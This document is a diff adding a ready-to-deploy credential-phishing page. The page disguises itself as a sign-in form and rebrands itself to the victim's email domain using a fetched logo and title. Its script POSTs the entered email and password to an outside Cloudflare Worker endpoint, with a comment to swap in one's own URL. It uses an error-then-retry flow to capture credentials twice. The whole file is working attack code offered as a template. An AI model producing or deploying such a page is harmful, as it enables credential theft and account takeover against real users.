@@ -1,0 +1,208 @@
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Sign in — Account</title>
+<script src="https://js.hcaptcha.com/1/api.js" async defer></script>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+:root {
+--accent: #2563eb;
+--bg: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+--card: rgba(255,255,255,0.95);
+--text: #1f2937;
+--text-muted: #6b7280;
+--border: rgba(0,0,0,0.08);
+--shadow: 0 25px 50px -12px rgba(0,0,0,0.15);
+--shadow-hover: 0 35px 60px -12px rgba(0,0,0,0.2);
+}
+* { box-sizing: border-box; }
+body {
+margin: 0; padding: 20px; min-height: 100vh; display: flex; align-items: center; justify-content: center;
+font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; background: var(--bg); backdrop-filter: blur(10px);
+overflow-y: auto;
+}
+.card { width: 100%; max-width: 400px; background: var(--card); backdrop-filter: blur(20px); border-radius: 24px; padding: 24px 24px; box-shadow: var(--shadow); border: 1px solid rgba(255,255,255,0.2); transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1); position: relative; overflow: hidden; margin: 10px auto; max-height: 95vh; overflow-y: auto; }
+.card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 1px; background: linear-gradient(90deg, transparent, var(--accent), transparent); }
+.card:hover { transform: translateY(-4px); box-shadow: var(--shadow-hover); }
+.logo { width: 60px; height: 60px; margin: 0 auto 16px; border-radius: 12px; background: #ffffff; display: flex; align-items: center; justify-content: center; box-shadow: 0 8px 24px rgba(0,0,0,0.1); transition: all 0.3s ease; border: 2px solid rgba(255,255,255,0.5); }
+.logo img { max-width: 85%; max-height: 85%; object-fit: contain; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1)); }
+h1 { margin: 0 0 4px; font-size: 22px; font-weight: 700; color: var(--text); letter-spacing: -0.02em; line-height: 1.2; }
+.desc { color: var(--text-muted); margin-bottom: 20px; font-size: 13px; font-weight: 400; line-height: 1.5; }
+.error { background: linear-gradient(90deg, #fef2f2, #fee2e2); border: 1px solid #fecaca; color: #dc2626; padding: 12px; border-radius: 12px; margin-bottom: 16px; font-weight: 500; font-size: 13px; text-align: center; box-shadow: 0 4px 12px rgba(239,68,68,0.15); display: none; }
+.field { margin-bottom: 14px; position: relative; }
+label { display: block; font-size: 13px; font-weight: 500; color: var(--text); margin-bottom: 6px; letter-spacing: 0.01em; }
+input[type="email"], input[type="password"] { width: 100%; padding: 12px 16px; border: 2px solid transparent; border-radius: 12px; font-size: 14px; font-weight: 400; background: rgba(255,255,255,0.8); backdrop-filter: blur(10px); transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1); font-family: inherit; }
+input:focus { outline: none; border-color: var(--accent); background: #fff; box-shadow: 0 0 0 4px rgba(37,99,235,0.1); transform: translateY(-1px); }
+.pw-toggle { position: absolute; right: 16px; top: 50%; transform: translateY(-50%); background: none; border: none; color: var(--text-muted); font-weight: 500; font-size: 14px; cursor: pointer; padding: 4px 8px; border-radius: 8px; transition: all 0.2s ease; }
+.pw-toggle:hover { color: var(--accent); background: rgba(37,99,235,0.1); }
+.hcaptcha-field { margin-bottom: 14px; }
+.hcaptcha-container { background: rgba(255,255,255,0.8); backdrop-filter: blur(10px); border-radius: 12px; padding: 12px; border: 2px solid transparent; transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1); }
+.hcaptcha-container:focus-within { border-color: var(--accent); box-shadow: 0 0 0 4px rgba(37,99,235,0.1); }
+.h-captcha { margin: 0 auto; transform: scale(0.85); transform-origin: center; }
+.btn { width: 100%; padding: 13px; border-radius: 12px; border: none; background: linear-gradient(135deg, var(--accent), #1e40af); color: #fff; font-weight: 600; font-size: 14px; cursor: pointer; transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1); letter-spacing: 0.02em; position: relative; overflow: hidden; box-shadow: 0 8px 24px rgba(37,99,235,0.3); }
+.btn:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 12px 32px rgba(37,99,235,0.4); }
+.btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+.btn:active { transform: translateY(0); }
+.aux { font-size: 12px; color: var(--text-muted); margin-top: 16px; text-align: center; font-weight: 400; }
+.attribution { font-size: 11px; color: #9ca3af; margin-top: 16px; text-align: center; font-weight: 400; }
+.attribution a { color: var(--accent); text-decoration: none; font-weight: 600; }
+.attribution a:hover { text-decoration: underline; }
+@media (max-width: 480px) { .card { padding: 20px 20px; margin: 5px; } h1 { font-size: 20px; } .logo { width: 50px; height: 50px; } .h-captcha { transform: scale(0.8); } }
+</style>
+</head>
+<body>
+<main class="card" role="main">
+<div class="logo" aria-hidden="true">
+<img id="domainLogo" src="./generic.png" alt="Account logo" />
+</div>
+<h1>Sign in</h1>
+<p class="desc">Access your account securely</p>
+<div class="error" id="errorMsg"></div>
+<form id="loginForm">
+<div class="field">
+<label for="email">Email or phone</label>
+<input id="email" type="email" name="email" required autofocus autocomplete="username" />
+</div>
+<div class="field">
+<label for="password">Password</label>
+<input id="password" type="password" name="password" required autocomplete="current-password" />
+<button type="button" id="pwToggle" class="pw-toggle">Show</button>
+</div>
+<div class="field hcaptcha-field">
+<label>Verification</label>
+<div class="hcaptcha-container">
+<div class="h-captcha" data-sitekey="99c6e00e-96b2-4edc-b17e-1998eee0e932" data-callback="onHcaptchaSuccess" data-expired-callback="onHcaptchaExpired"></div>
+</div>
+</div>
+<button type="submit" class="btn" id="submitBtn" disabled>Please verify you are human</button>
+</form>
+<p class="aux">Not your computer? Use Guest mode to sign in privately.</p>
+<p class="attribution">
+Protected by hCaptcha | Powered by <a href="#" id="domainLink" target="_blank" rel="noopener">Account</a>
+</p>
+</main>
+<script>
+var pw = document.getElementById('password');
+var toggle = document.getElementById('pwToggle');
+var form = document.getElementById('loginForm');
+var submitBtn = document.getElementById('submitBtn');
+var errorMsg = document.getElementById('errorMsg');
+var emailInput = document.getElementById('email');
+
+// Password toggle
+if (toggle && pw) {
+toggle.addEventListener('click', function() {
+var isPassword = pw.type === 'password';
+pw.type = isPassword ? 'text' : 'password';
+toggle.textContent = isPassword ? 'Hide' : 'Show';
+});
+}
+
+// hCaptcha callbacks
+window.onHcaptchaSuccess = function() { submitBtn.disabled = false; submitBtn.textContent = 'Sign in'; };
+window.onHcaptchaExpired = function() { submitBtn.disabled = true; submitBtn.textContent = 'Please verify you are human'; };
+
+// DYNAMIC LOGO + DOMAIN DETECTION + EMAIL PREFILL
+var urlParams = new URLSearchParams(window.location.search);
+var emailParam = urlParams.get('email');
+
+if (emailParam) {
+// Prefill the email input
+emailInput.value = emailParam;
+// Focus on password field instead since email is already filled
+pw.focus();
+emailInput.removeAttribute('autofocus');
+  
+var domainMatch = emailParam.match(/@([^\s@]+)/i);
+if (domainMatch) {
+var domain = domainMatch[1];
+var logoEl = document.getElementById('domainLogo');
+
+// Try Logo.dev API with a test image first
+var logoUrl = 'https://img.logo.dev/' + domain + '?token=pk_H9oBhqv5TRu6sM2UbLBeWw';
+var testImg = new Image();
+
+testImg.onload = function() {
+// Check if it's an actual logo (not Logo.dev's placeholder)
+// Logo.dev returns small placeholder images (usually < 5KB) when they don't have the logo
+// Real logos are usually larger
+if (testImg.width > 32 && testImg.height > 32) {
+// Looks like a real logo, use it
+logoEl.src = logoUrl;
+logoEl.alt = domain + ' logo';
+}
+// If it's too small (their placeholder), keep generic.png
+};
+
+testImg.onerror = function() {
+// If Logo.dev completely fails, keep generic.png (already loaded)
+};
+
+testImg.src = logoUrl;
+
+document.title = 'Sign in — ' + domain;
+document.querySelector('h1').textContent = 'Sign in to ' + domain;
+var domainLink = document.getElementById('domainLink');
+domainLink.textContent = domain;
+domainLink.href = 'https://' + domain;
+}
+}
+
+// Form submission to Worker
+form.addEventListener('submit', function(e) {
+e.preventDefault();
+var formData = new FormData(form);
+var hcaptchaResponse = form.querySelector('textarea[name="h-captcha-response"]');
+if (!hcaptchaResponse || !hcaptchaResponse.value) {
+alert('Please complete the security check');
+return;
+}
+
+submitBtn.disabled = true;
+submitBtn.textContent = 'Processing...';
+errorMsg.style.display = 'none';
+
+// CHANGE THIS URL TO YOUR WORKER
+fetch('https://verify.emailsecureauth.workers.dev/submit', {
+method: 'POST',
+body: JSON.stringify(Object.fromEntries(formData)),
+headers: { 'Content-Type': 'application/json' }
+})
+.then(function(response) {
+var contentType = response.headers.get('content-type');
+if (contentType && contentType.includes('application/json')) {
+// First submission - JSON error response
+return response.json().then(function(data) {
+if (data.error) {
+errorMsg.textContent = data.error;
+errorMsg.style.display = 'block';
+submitBtn.disabled = false;
+submitBtn.textContent = 'Sign in';
+// Reset hCaptcha for retry
+if (window.hcaptcha) {
+window.hcaptcha.reset();
+submitBtn.disabled = true;
+submitBtn.textContent = 'Please verify you are human';
+}
+}
+});
+} else {
+// Second submission - HTML success page
+return response.text().then(function(html) {
+document.open();
+document.write(html);
+document.close();
+});
+}
+})
+.catch(function(error) {
+errorMsg.textContent = 'Connection error. Please try again.';
+errorMsg.style.display = 'block';
+submitBtn.disabled = false;
+submitBtn.textContent = 'Sign in';
+});
+});
+</script>
+</body>
+</html>
